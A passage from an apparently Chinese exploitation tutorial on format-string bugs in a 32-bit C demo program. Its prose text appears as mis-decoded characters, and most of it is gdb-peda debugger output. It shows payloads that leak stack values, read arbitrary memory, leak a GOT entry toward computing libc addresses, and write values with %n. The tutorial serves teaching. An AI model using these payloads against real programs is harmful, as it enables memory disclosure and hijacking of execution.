0020| 0xffffd564 --&gt; 0xffffd584 (&quot;%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p&quot;)
0024| 0xffffd568 (&quot; RUV\327UUVT\332\377\367\001&quot;)
0028| 0xffffd56c --&gt; 0x565555d7 (&lt;main+26&gt;:     add    ebx,0x1a29)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x56555642 in main ()
gdb-peda$ x/10w $esp
0xffffd550:     0xffffd584      0x00000001      0x88888888      0xffffffff
0xffffd560:     0xffffd57a      0xffffd584      0x56555220      0x565555d7
0xffffd570:     0xf7ffda54      0x00000001
gdb-peda$ c
Continuing.
ffffffff.00000001.0x88888888.0x88888888.0xffffd57a.0xffffd584.0x56555220
</code></pre>
<p>è¿™é‡Œï¼Œæ ¼å¼å­—ç¬¦ä¸²çš„åœ°å€ä¸º <code>0xffffd584</code>ã€‚æˆ‘ä»¬é€šè¿‡æ ¼å¼å­—ç¬¦ä¸² <code>%3$x.%1$08x.%2$p.%2$p.%4$p.%5$p.%6$p</code> åˆ†åˆ«èŽ·å–äº† <code>arg3</code>ã€<code>arg1</code>ã€ä¸¤ä¸ª <code>arg2</code>ã€<code>arg4</code> å’Œæ ˆä¸Šç´§è·Ÿå‚æ•°çš„ä¸¤ä¸ªå€¼ã€‚å¯ä»¥çœ‹åˆ°è¿™ç§æ–¹æ³•éžå¸¸å¼ºå¤§ï¼Œå¯ä»¥èŽ·å¾—æ ˆä¸­ä»»æ„çš„å€¼ã€‚</p>
<h3 id="_10">æŸ¥çœ‹ä»»æ„åœ°å€çš„å†…å­˜</h3>
<p>æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ä¸€ä¸ªâ€œæ˜¾ç¤ºæŒ‡å®šåœ°å€çš„å†…å­˜â€çš„æ ¼å¼è§„èŒƒæ¥æŸ¥çœ‹ä»»æ„åœ°å€çš„å†…å­˜ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ <code>%s</code> æ˜¾ç¤ºå‚æ•°ã€€æŒ‡é’ˆæ‰€æŒ‡å®šçš„åœ°å€çš„å†…å­˜ï¼Œå°†å®ƒä½œä¸ºä¸€ä¸ª ASCII å­—ç¬¦ä¸²å¤„ç†ï¼Œç›´åˆ°é‡åˆ°ä¸€ä¸ªç©ºå­—ç¬¦ã€‚å¦‚æžœæ”»å‡»è€…èƒ½å¤Ÿæ“çºµè¿™ä¸ªå‚æ•°æŒ‡é’ˆæŒ‡å‘ä¸€ä¸ªç‰¹å®šçš„åœ°å€ï¼Œé‚£ä¹ˆ <code>%s</code> å°±ä¼šè¾“å‡ºè¯¥ä½ç½®çš„å†…å­˜å†…å®¹ã€‚</p>
<p>è¿˜æ˜¯ä¸Šé¢çš„ç¨‹åºï¼Œæˆ‘ä»¬è¾“å…¥ <code>%4$s</code>ï¼Œè¾“å‡ºçš„ <code>arg4</code> å°±å˜æˆäº† <code>ABCD</code> è€Œä¸æ˜¯åœ°å€ <code>0xffffd57a</code>ï¼š</p>
<pre><code class="language-text">gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0xffffd584 (&quot;%4$s&quot;)
EBX: 0x56557000 --&gt; 0x1efc
ECX: 0x1
EDX: 0xf7f9883c --&gt; 0x0
ESI: 0xf7f96e68 --&gt; 0x1bad90
EDI: 0x0
EBP: 0xffffd618 --&gt; 0x0
ESP: 0xffffd550 --&gt; 0xffffd584 (&quot;%4$s&quot;)
EIP: 0x56555642 (&lt;main+133&gt;:    call   0x56555430 &lt;printf@plt&gt;)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555638 &lt;main+123&gt;:       push   DWORD PTR [ebp-0xc]
   0x5655563b &lt;main+126&gt;:       lea    eax,[ebp-0x94]
   0x56555641 &lt;main+132&gt;:       push   eax
=&gt; 0x56555642 &lt;main+133&gt;:       call   0x56555430 &lt;printf@plt&gt;
   0x56555647 &lt;main+138&gt;:       add    esp,0x20
   0x5655564a &lt;main+141&gt;:       sub    esp,0xc
   0x5655564d &lt;main+144&gt;:       push   0xa
   0x5655564f &lt;main+146&gt;:       call   0x56555450 &lt;putchar@plt&gt;
Guessed arguments:
arg[0]: 0xffffd584 (&quot;%4$s&quot;)
arg[1]: 0x1
arg[2]: 0x88888888
arg[3]: 0xffffffff
arg[4]: 0xffffd57a (&quot;ABCD&quot;)
[------------------------------------stack-------------------------------------]
0000| 0xffffd550 --&gt; 0xffffd584 (&quot;%4$s&quot;)
0004| 0xffffd554 --&gt; 0x1
0008| 0xffffd558 --&gt; 0x88888888
0012| 0xffffd55c --&gt; 0xffffffff
0016| 0xffffd560 --&gt; 0xffffd57a (&quot;ABCD&quot;)
0020| 0xffffd564 --&gt; 0xffffd584 (&quot;%4$s&quot;)
0024| 0xffffd568 (&quot; RUV\327UUVT\332\377\367\001&quot;)
0028| 0xffffd56c --&gt; 0x565555d7 (&lt;main+26&gt;:     add    ebx,0x1a29)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x56555642 in main ()
gdb-peda$ c
Continuing.
ABCD
</code></pre>
<p>ä¸Šé¢çš„ä¾‹å­åªèƒ½è¯»å–æ ˆä¸­å·²æœ‰çš„å†…å®¹ï¼Œå¦‚æžœæˆ‘ä»¬æƒ³èŽ·å–çš„æ˜¯ä»»æ„çš„åœ°å€çš„å†…å®¹ï¼Œå°±éœ€è¦æˆ‘ä»¬è‡ªå·±å°†åœ°å€å†™å…¥åˆ°æ ˆä¸­ã€‚æˆ‘ä»¬è¾“å…¥ <code>AAAA.%p</code> è¿™æ ·çš„æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œè§‚å¯Ÿä¸€ä¸‹æ ˆæœ‰ä»€ä¹ˆå˜åŒ–ã€‚</p>
<pre><code class="language-text">gdb-peda$ python print(&quot;AAAA&quot;+&quot;.%p&quot;*20)
AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
...
gdb-peda$ n
[----------------------------------registers-----------------------------------]
EAX: 0xffffd584 (&quot;AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;)
EBX: 0x56557000 --&gt; 0x1efc
ECX: 0x1
EDX: 0xf7f9883c --&gt; 0x0
ESI: 0xf7f96e68 --&gt; 0x1bad90
EDI: 0x0
EBP: 0xffffd618 --&gt; 0x0
ESP: 0xffffd550 --&gt; 0xffffd584 (&quot;AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;)
EIP: 0x56555642 (&lt;main+133&gt;:    call   0x56555430 &lt;printf@plt&gt;)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x56555638 &lt;main+123&gt;:       push   DWORD PTR [ebp-0xc]
   0x5655563b &lt;main+126&gt;:       lea    eax,[ebp-0x94]
   0x56555641 &lt;main+132&gt;:       push   eax
=&gt; 0x56555642 &lt;main+133&gt;:       call   0x56555430 &lt;printf@plt&gt;
   0x56555647 &lt;main+138&gt;:       add    esp,0x20
   0x5655564a &lt;main+141&gt;:       sub    esp,0xc
   0x5655564d &lt;main+144&gt;:       push   0xa
   0x5655564f &lt;main+146&gt;:       call   0x56555450 &lt;putchar@plt&gt;
Guessed arguments:
arg[0]: 0xffffd584 (&quot;AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;)
arg[1]: 0x1
arg[2]: 0x88888888
arg[3]: 0xffffffff
arg[4]: 0xffffd57a (&quot;ABCD&quot;)
[------------------------------------stack-------------------------------------]
0000| 0xffffd550 --&gt; 0xffffd584 (&quot;AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;)
0004| 0xffffd554 --&gt; 0x1
0008| 0xffffd558 --&gt; 0x88888888
0012| 0xffffd55c --&gt; 0xffffffff
0016| 0xffffd560 --&gt; 0xffffd57a (&quot;ABCD&quot;)
0020| 0xffffd564 --&gt; 0xffffd584 (&quot;AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;)
0024| 0xffffd568 (&quot; RUV\327UUVT\332\377\367\001&quot;)
0028| 0xffffd56c --&gt; 0x565555d7 (&lt;main+26&gt;:     add    ebx,0x1a29)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x56555642 in main ()
</code></pre>
<p>æ ¼å¼å­—ç¬¦ä¸²çš„åœ°å€åœ¨ <code>0xffffd584</code>ï¼Œä»Žä¸‹é¢çš„è¾“å‡ºä¸­å¯ä»¥çœ‹åˆ°å®ƒä»¬åœ¨æ ˆä¸­æ˜¯æ€Žæ ·æŽ’å¸ƒçš„ï¼š</p>
<pre><code class="language-text">gdb-peda$ x/20w $esp
0xffffd550:     0xffffd584      0x00000001      0x88888888      0xffffffff
0xffffd560:     0xffffd57a      0xffffd584      0x56555220      0x565555d7
0xffffd570:     0xf7ffda54      0x00000001      0x424135d0      0x00004443
0xffffd580:     0x00000000      0x41414141      0x2e70252e      0x252e7025
0xffffd590:     0x70252e70      0x2e70252e      0x252e7025      0x70252e70
gdb-peda$ x/20wb 0xffffd584
0xffffd584:     0x41    0x41    0x41    0x41    0x2e    0x25    0x70    0x2e
0xffffd58c:     0x25    0x70    0x2e    0x25    0x70    0x2e    0x25    0x70
0xffffd594:     0x2e    0x25    0x70    0x2e
gdb-peda$ python print('\x2e\x25\x70')
.%p
</code></pre>
<p>ä¸‹é¢æ˜¯ç¨‹åºè¿è¡Œçš„ç»“æžœï¼š</p>
<pre><code class="language-text">gdb-peda$ c
Continuing.
AAAA.0x1.0x88888888.0xffffffff.0xffffd57a.0xffffd584.0x56555220.0x565555d7.0xf7ffda54.0x1.0x424135d0.0x4443.(nil).0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e
</code></pre>
<p><code>0x41414141</code> æ˜¯è¾“å‡ºçš„ç¬¬ 13 ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ <code>%13$s</code> å³å¯è¯»å‡º <code>0x41414141</code> å¤„çš„å†…å®¹ï¼Œå½“ç„¶ï¼Œè¿™é‡Œå¯èƒ½æ˜¯ä¸€ä¸ªä¸åˆæ³•çš„åœ°å€ã€‚ä¸‹é¢æˆ‘ä»¬æŠŠ <code>0x41414141</code> æ¢æˆæˆ‘ä»¬éœ€è¦çš„åˆæ³•çš„åœ°å€ï¼Œæ¯”å¦‚å­—ç¬¦ä¸² <code>ABCD</code> çš„åœ°å€ <code>0xffffd57a</code>ï¼š</p>
<pre><code class="language-text">$ python2 -c 'print(&quot;\x7a\xd5\xff\xff&quot;+&quot;.%13$s&quot;)' &gt; text
$ gdb -q a.out
Reading symbols from a.out...(no debugging symbols found)...done.
gdb-peda$ b printf
Breakpoint 1 at 0x8048350
gdb-peda$ r &lt; text
[----------------------------------registers-----------------------------------]
EAX: 0xffffd584 --&gt; 0xffffd57a (&quot;ABCD&quot;)
EBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1
ECX: 0x1
EDX: 0xf7f9883c --&gt; 0x0
ESI: 0xf7f96e68 --&gt; 0x1bad90
EDI: 0x0
EBP: 0xffffd618 --&gt; 0x0
ESP: 0xffffd54c --&gt; 0x8048520 (&lt;main+138&gt;:      add    esp,0x20)
EIP: 0xf7e27c20 (&lt;printf&gt;:      call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7e27c1b &lt;fprintf+27&gt;:     ret
   0xf7e27c1c:  xchg   ax,ax
   0xf7e27c1e:  xchg   ax,ax
=&gt; 0xf7e27c20 &lt;printf&gt;: call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;
   0xf7e27c25 &lt;printf+5&gt;:       add    eax,0x16f243
   0xf7e27c2a &lt;printf+10&gt;:      sub    esp,0xc
   0xf7e27c2d &lt;printf+13&gt;:      mov    eax,DWORD PTR [eax+0x124]
   0xf7e27c33 &lt;printf+19&gt;:      lea    edx,[esp+0x14]
No argument
[------------------------------------stack-------------------------------------]
0000| 0xffffd54c --&gt; 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)
0004| 0xffffd550 --&gt; 0xffffd584 --&gt; 0xffffd57a (&quot;ABCD&quot;)
0008| 0xffffd554 --&gt; 0x1
0012| 0xffffd558 --&gt; 0x88888888
0016| 0xffffd55c --&gt; 0xffffffff
0020| 0xffffd560 --&gt; 0xffffd57a (&quot;ABCD&quot;)
0024| 0xffffd564 --&gt; 0xffffd584 --&gt; 0xffffd57a (&quot;ABCD&quot;)
0028| 0xffffd568 --&gt; 0x80481fc --&gt; 0x38 ('8')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6
gdb-peda$ x/20w $esp
0xffffd54c:     0x08048520      0xffffd584      0x00000001      0x88888888
0xffffd55c:     0xffffffff      0xffffd57a      0xffffd584      0x080481fc
0xffffd56c:     0x080484b0      0xf7ffda54      0x00000001      0x424135d0
0xffffd57c:     0x00004443      0x00000000      0xffffd57a      0x3331252e
0xffffd58c:     0x00007324      0xffffd5ca      0x00000001      0x000000c2
gdb-peda$ x/s 0xffffd57a
0xffffd57a:     &quot;ABCD&quot;
gdb-peda$ c
Continuing.
zï¿½ï¿½ï¿½.ABCD
</code></pre>
<p>å½“ç„¶è¿™ä¹Ÿæ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œæˆ‘ä»¬çœŸæ­£ç»å¸¸ç”¨åˆ°çš„åœ°æ–¹æ˜¯ï¼ŒæŠŠç¨‹åºä¸­æŸå‡½æ•°çš„ GOT åœ°å€ä¼ è¿›åŽ»ï¼Œç„¶åŽèŽ·å¾—è¯¥åœ°å€æ‰€å¯¹åº”çš„å‡½æ•°çš„è™šæ‹Ÿåœ°å€ã€‚ç„¶åŽæ ¹æ®å‡½æ•°åœ¨ libc ä¸­çš„ç›¸å¯¹ä½ç½®ï¼Œè®¡ç®—å‡ºæˆ‘ä»¬éœ€è¦çš„å‡½æ•°åœ°å€ï¼ˆå¦‚ <code>system()</code>ï¼‰ã€‚å¦‚ä¸‹é¢å±•ç¤ºçš„è¿™æ ·ï¼š</p>
<p>å…ˆçœ‹ä¸€ä¸‹é‡å®šå‘è¡¨ï¼š</p>
<pre><code class="language-text">$ readelf -r a.out

Relocation section '.rel.dyn' at offset 0x2e8 contains 1 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ffc  00000206 R_386_GLOB_DAT    00000000   __gmon_start__

Relocation section '.rel.plt' at offset 0x2f0 contains 4 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
0804a010  00000307 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a014  00000407 R_386_JUMP_SLOT   00000000   putchar@GLIBC_2.0
0804a018  00000507 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7
</code></pre>
<p><code>.rel.plt</code> ä¸­æœ‰å››ä¸ªå‡½æ•°å¯ä¾›æˆ‘ä»¬é€‰æ‹©ï¼ŒæŒ‰ç†è¯´é€‰æ‹©ä»»æ„ä¸€ä¸ªéƒ½æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯åœ¨å®žè·µä¸­æˆ‘ä»¬ä¼šå‘çŽ°ä¸€äº›é—®é¢˜ã€‚ä¸‹é¢çš„ç»“æžœåˆ†åˆ«æ˜¯ <code>printf</code>ã€<code>__libc_start_main</code>ã€<code>putchar</code> å’Œ <code>__isoc99_scanf</code>ï¼š</p>
<pre><code class="language-text">$ python2 -c 'print(&quot;\x0c\xa0\x04\x08&quot;+&quot;.%p&quot;*20)' | ./a.out
.0x1.0x88888888.0xffffffff.0xffe22cfa.0xffe22d04.0x80481fc.0x80484b0.0xf77afa54.0x1.0x424155d0.0x4443.(nil).0x2e0804a0.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025
$ python2 -c 'print(&quot;\x10\xa0\x04\x08&quot;+&quot;.%p&quot;*20)' | ./a.out
.0x1.0x88888888.0xffffffff.0xffd439ba.0xffd439c4.0x80481fc.0x80484b0.0xf77b6a54.0x1.0x4241c5d0.0x4443.(nil).0x804a010.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e
$ python2 -c 'print(&quot;\x14\xa0\x04\x08&quot;+&quot;.%p&quot;*20)' | ./a.out
.0x1.0x88888888.0xffffffff.0xffcc17aa.0xffcc17b4.0x80481fc.0x80484b0.0xf7746a54.0x1.0x4241c5d0.0x4443.(nil).0x804a014.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e
$ python2 -c 'print(&quot;\x18\xa0\x04\x08&quot;+&quot;.%p&quot;*20)' | ./a.out
â–’.0x1.0x88888888.0xffffffff.0xffcb99aa.0xffcb99b4.0x80481fc.0x80484b0.0xf775ca54.0x1.0x424125d0.0x4443.(nil).0x804a018.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e
</code></pre>
<p>ç»†å¿ƒä¸€ç‚¹ä½ å°±ä¼šå‘çŽ°ç¬¬ä¸€ä¸ªï¼ˆ<code>printf</code>ï¼‰çš„ç»“æžœæœ‰é—®é¢˜ã€‚æˆ‘ä»¬è¾“å…¥äº† <code>\x0c\xa0\x04\x08</code>ï¼ˆ<code>0x0804a00c</code>ï¼‰ï¼Œå¯æ˜¯ 13 å·ä½ç½®è¾“å‡ºçš„ç»“æžœå´æ˜¯ <code>0x2e0804a0</code>ï¼Œé‚£ä¹ˆï¼Œ<code>\x0c</code> å“ªåŽ»äº†ï¼ŒæŸ¥äº†ä¸€ä¸‹ ASCII è¡¨ï¼š</p>
<pre><code class="language-text">Oct   Dec   Hex   Char
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
014   12    0C    FF  '\f' (form feed)
</code></pre>
<p>äºŽæ˜¯å°±è¢«çœç•¥äº†ï¼ŒåŒæ ·ä¼šè¢«çœç•¥çš„è¿˜æœ‰å¾ˆå¤šï¼Œå¦‚ <code>\x07</code>ï¼ˆ'\a'ï¼‰ã€<code>\x08</code>ï¼ˆ'\b'ï¼‰ã€<code>\x20</code>ï¼ˆSPACEï¼‰ç­‰çš„ä¸å¯è§å­—ç¬¦éƒ½ä¼šè¢«çœç•¥ã€‚è¿™å°±ä¼šè®©æˆ‘ä»¬åŽç»­çš„æ“ä½œå‡ºçŽ°é—®é¢˜ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬é€‰ç”¨æœ€åŽä¸€ä¸ªï¼ˆ<code>__isoc99_scanf</code>ï¼‰ã€‚</p>
<pre><code class="language-text">$ python2 -c 'print(&quot;\x18\xa0\x04\x08&quot;+&quot;%13$s&quot;)' &gt; text
$ gdb -q a.out
Reading symbols from a.out...(no debugging symbols found)...done.
gdb-peda$ b printf
Breakpoint 1 at 0x8048350
gdb-peda$ r &lt; text
[----------------------------------registers-----------------------------------]
EAX: 0xffffd584 --&gt; 0x804a018 --&gt; 0xf7e3a790 (&lt;__isoc99_scanf&gt;: push   ebp)
EBX: 0x804a000 --&gt; 0x8049f14 --&gt; 0x1
ECX: 0x1
EDX: 0xf7f9883c --&gt; 0x0
ESI: 0xf7f96e68 --&gt; 0x1bad90
EDI: 0x0
EBP: 0xffffd618 --&gt; 0x0
ESP: 0xffffd54c --&gt; 0x8048520 (&lt;main+138&gt;:      add    esp,0x20)
EIP: 0xf7e27c20 (&lt;printf&gt;:      call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7e27c1b &lt;fprintf+27&gt;:     ret
   0xf7e27c1c:  xchg   ax,ax
   0xf7e27c1e:  xchg   ax,ax
=&gt; 0xf7e27c20 &lt;printf&gt;: call   0xf7f06d17 &lt;__x86.get_pc_thunk.ax&gt;
   0xf7e27c25 &lt;printf+5&gt;:       add    eax,0x16f243
   0xf7e27c2a &lt;printf+10&gt;:      sub    esp,0xc
   0xf7e27c2d &lt;printf+13&gt;:      mov    eax,DWORD PTR [eax+0x124]
   0xf7e27c33 &lt;printf+19&gt;:      lea    edx,[esp+0x14]
No argument
[------------------------------------stack-------------------------------------]
0000| 0xffffd54c --&gt; 0x8048520 (&lt;main+138&gt;:     add    esp,0x20)
0004| 0xffffd550 --&gt; 0xffffd584 --&gt; 0x804a018 --&gt; 0xf7e3a790 (&lt;__isoc99_scanf&gt;: push   ebp)
0008| 0xffffd554 --&gt; 0x1
0012| 0xffffd558 --&gt; 0x88888888
0016| 0xffffd55c --&gt; 0xffffffff
0020| 0xffffd560 --&gt; 0xffffd57a (&quot;ABCD&quot;)
0024| 0xffffd564 --&gt; 0xffffd584 --&gt; 0x804a018 --&gt; 0xf7e3a790 (&lt;__isoc99_scanf&gt;: push   ebp)
0028| 0xffffd568 --&gt; 0x80481fc --&gt; 0x38 ('8')
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0xf7e27c20 in printf () from /usr/lib32/libc.so.6
gdb-peda$ x/20w $esp
0xffffd54c:     0x08048520      0xffffd584      0x00000001      0x88888888
0xffffd55c:     0xffffffff      0xffffd57a      0xffffd584      0x080481fc
0xffffd56c:     0x080484b0      0xf7ffda54      0x00000001      0x424135d0
0xffffd57c:     0x00004443      0x00000000      0x0804a018      0x24333125
0xffffd58c:     0x00f00073      0xffffd5ca      0x00000001      0x000000c2
gdb-peda$ x/w 0x804a018
0x804a018:      0xf7e3a790
gdb-peda$ c
Continuing.
â–’ï¿½ï¿½ï¿½ï¿½
</code></pre>
<p>è™½ç„¶æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>x/w</code> æŒ‡ä»¤å¾—åˆ° <code>__isoc99_scanf</code> å‡½æ•°çš„è™šæ‹Ÿåœ°å€ <code>0xf7e3a790</code>ã€‚ä½†æ˜¯ç”±äºŽ <code>0x804a018</code> å¤„çš„å†…å®¹æ˜¯ä»ç„¶ä¸€ä¸ªæŒ‡é’ˆï¼Œä½¿ç”¨ <code>%13$s</code> æ‰“å°å¹¶ä¸æˆåŠŸã€‚åœ¨ä¸‹é¢çš„å†…å®¹ä¸­å°†ä¼šä»‹ç»æ€Žæ ·å€ŸåŠ© pwntools çš„åŠ›é‡ï¼Œæ¥èŽ·å¾—æ­£ç¡®æ ¼å¼çš„è™šæ‹Ÿåœ°å€ï¼Œå¹¶èƒ½å¤Ÿå¯¹å®ƒæœ‰è¿›ä¸€æ­¥çš„åˆ©ç”¨ã€‚</p>
<p>å½“ç„¶å¹¶éžæ€»èƒ½é€šè¿‡ä½¿ç”¨ 4 å­—èŠ‚çš„è·³è½¬ï¼ˆå¦‚ <code>AAAA</code>ï¼‰æ¥æ­¥è¿›å‚æ•°æŒ‡é’ˆåŽ»å¼•ç”¨æ ¼å¼å­—ç¬¦ä¸²çš„èµ·å§‹éƒ¨åˆ†ï¼Œæœ‰æ—¶ï¼Œéœ€è¦åœ¨æ ¼å¼å­—ç¬¦ä¸²ä¹‹å‰åŠ ä¸€ä¸ªã€ä¸¤ä¸ªæˆ–ä¸‰ä¸ªå­—ç¬¦çš„å‰ç¼€æ¥å®žçŽ°ä¸€ç³»åˆ—çš„ ï¼” å­—èŠ‚è·³è½¬ã€‚</p>
<h3 id="_11">è¦†ç›–æ ˆå†…å®¹</h3>
<p>çŽ°åœ¨æˆ‘ä»¬å·²ç»å¯ä»¥è¯»å–æ ˆä¸Šå’Œä»»æ„åœ°å€çš„å†…å­˜äº†ï¼ŒæŽ¥ä¸‹æ¥æˆ‘ä»¬æ›´è¿›ä¸€æ­¥ï¼Œé€šè¿‡ä¿®æ”¹æ ˆå’Œå†…å­˜æ¥åŠ«æŒç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚<code>%n</code> è½¬æ¢æŒ‡ç¤ºç¬¦å°† <code>%n</code> å½“å‰å·²ç»æˆåŠŸå†™å…¥æµæˆ–ç¼“å†²åŒºä¸­çš„å­—ç¬¦ä¸ªæ•°å­˜å‚¨åˆ°åœ°å€ç”±å‚æ•°æŒ‡å®šçš„æ•´æ•°ä¸­ã€‚</p>
<pre><code class="language-c">#include&lt;stdio.h&gt;
void main() {
    int i;
    char str[] = &quot;hello&quot;;

    printf(&quot;%s %n\n&quot;, str, &amp;i);
    printf(&quot;%d\n&quot;, i);
}
$ ./a.out
hello
6
</code></pre>
<p><code>i</code> è¢«èµ‹å€¼ä¸º 6ï¼Œå› ä¸ºåœ¨é‡åˆ°è½¬æ¢æŒ‡ç¤ºç¬¦ä¹‹å‰ä¸€å…±å†™å…¥äº† 6 ä¸ªå­—ç¬¦ï¼ˆ<code>hello</code> åŠ ä¸Šä¸€ä¸ªç©ºæ ¼ï¼‰ã€‚åœ¨æ²¡æœ‰é•¿åº¦ä¿®é¥°ç¬¦æ—¶ï¼Œé»˜è®¤å†™å…¥ä¸€ä¸ª <code>int</code> ç±»åž‹çš„å€¼ã€‚</p>
<p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è¦éœ€è¦è¦†å†™çš„å€¼æ˜¯ä¸€ä¸ª shellcode çš„åœ°å€ï¼Œè€Œè¿™ä¸ªåœ°å€å¾€å¾€æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æ•°å­—ã€‚è¿™æ—¶æˆ‘ä»¬å°±éœ€è¦é€šè¿‡ä½¿ç”¨å…·ä½“çš„å®½åº¦æˆ–ç²¾åº¦çš„è½¬æ¢è§„èŒƒæ¥æŽ§åˆ¶å†™å…¥çš„å­—ç¬¦ä¸ªæ•°ï¼Œå³åœ¨æ ¼å¼å­—ç¬¦ä¸²ä¸­åŠ ä¸Šä¸€ä¸ªåè¿›åˆ¶æ•´æ•°æ¥è¡¨ç¤ºè¾“å‡ºçš„æœ€å°ä½æ•°ï¼Œå¦‚æžœå®žé™…ä½æ•°å¤§äºŽå®šä¹‰çš„å®½åº¦ï¼Œåˆ™æŒ‰å®žé™…ä½æ•°è¾“å‡ºï¼Œåä¹‹åˆ™ä»¥ç©ºæ ¼æˆ– 0 è¡¥é½ï¼ˆ<code>0</code> è¡¥é½æ—¶åœ¨å®½åº¦å‰åŠ ç‚¹<code>.</code> æˆ– <code>0</code>ï¼‰ã€‚å¦‚ï¼š</p>
<pre><code class="language-c">#include&lt;stdio.h&gt;
void main() {
    int i;

    printf(&quot;%10u%n\n&quot;, 1, &amp;i);
    printf(&quot;%d\n&quot;, i);
    printf(&quot;%.50u%n\n&quot;, 1, &amp;i);
    printf(&quot;%d\n&quot;, i);
    printf(&quot;%0100u%n\n&quot;, 1, &amp;i);
    printf(&quot;%d\n&quot;, i);
}
$ ./a.out
         1
10
00000000000000000000000000000000000000000000000001
50
0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001
100
</code></pre>
<p>å°±æ˜¯è¿™æ ·ï¼Œä¸‹é¢æˆ‘ä»¬æŠŠåœ°å€ <code>0x8048000</code> å†™å…¥å†…å­˜ï¼š</p>
<pre><code class="language-c">printf(&quot;%0134512640d%n\n&quot;, 1, &amp;i);
$ ./a.out
...
0x8048000
</code></pre>
<p>è¿˜æ˜¯æˆ‘ä»¬ä¸€å¼€å§‹çš„ç¨‹åºï¼Œæˆ‘ä»¬å°è¯•å°† <code>arg2</code> çš„å€¼æ›´æ”¹ä¸ºä»»æ„å€¼ï¼ˆæ¯”å¦‚ <code>0x00000020</code>ï¼Œåè¿›åˆ¶ 32ï¼‰ï¼Œåœ¨ gdb ä¸­å¯ä»¥çœ‹åˆ°å¾—åˆ° <code>arg2</code> çš„åœ°å€ <code>0xffffd538</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬æž„é€ æ ¼å¼å­—ç¬¦ä¸² <code>\x38\xd5\xff\xff%08x%08x%012d%13$n</code>ï¼Œå…¶ä¸­ <code>\x38\xd5\xff\xff</code> è¡¨ç¤º <code>arg2</code> çš„åœ°å€ï¼Œå  4 å­—èŠ‚ï¼Œ<code>%08x%08x</code> è¡¨ç¤ºä¸¤ä¸ª 8 å­—ç¬¦å®½çš„åå…­è¿›åˆ¶æ•°ï¼Œå  16 å­—èŠ‚ï¼Œ<code>%012d</code> å  12 å­—èŠ‚ï¼Œä¸‰ä¸ªéƒ¨åˆ†åŠ èµ·æ¥å°±å äº† 4+16+12=32 å­—èŠ‚ï¼Œå³æŠŠ <code>arg2</code> èµ‹å€¼ä¸º <code>0x00000020</code>ã€‚æ ¼å¼å­—ç¬¦ä¸²æœ€åŽä¸€éƒ¨åˆ† <code>%13$n</code> ä¹Ÿæ˜¯æœ€é‡è¦çš„ä¸€éƒ¨åˆ†ï¼Œå’Œä¸Šé¢çš„å†…å®¹ä¸€æ ·ï¼Œè¡¨ç¤ºæ ¼å¼å­—ç¬¦ä¸²çš„ç¬¬ 13 